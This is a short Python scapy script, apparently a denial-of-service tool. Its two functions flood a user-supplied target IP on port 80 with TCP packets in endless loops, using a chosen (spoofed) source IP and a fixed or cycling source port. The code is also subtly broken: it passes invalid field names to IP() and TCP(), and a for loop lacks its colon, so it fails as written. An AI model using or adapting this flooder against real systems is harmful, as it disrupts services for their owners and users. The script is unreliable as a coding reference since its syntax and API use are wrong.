from scapy.all import *


def single_port_attack(source_IP, target_IP, source_port):
    i = 1
    while True:
        IP1 = IP(source_IP=source_IP, destination=target_IP)
        TCP1 = TCP(srcport=source_port, dstport=80)
        pkt = IP1 / TCP1
        send(pkt, inter=.001)

        i = i + 1


def multiple_port_attack(source_IP, target_IP, source_port):
    i = 1
    while True:
        for source_port in range(1, 65535)
            IP1 = IP(source_IP=source_IP, destination=target_IP)
            TCP1 = TCP(srcport=source_port, dstport=80)
            pkt = IP1 / TCP1
            send(pkt, inter=.001)

            i = i + 1


source_IP = input("Enter IP address of Source: ")
target_IP = input("Enter IP address of Target: ")
source_port = int(input("Enter Source Port Number:"))

# single_port_attack(source_IP, target_IP, source_port)
# multiple_port_attack(source_IP, target_IP, source_port)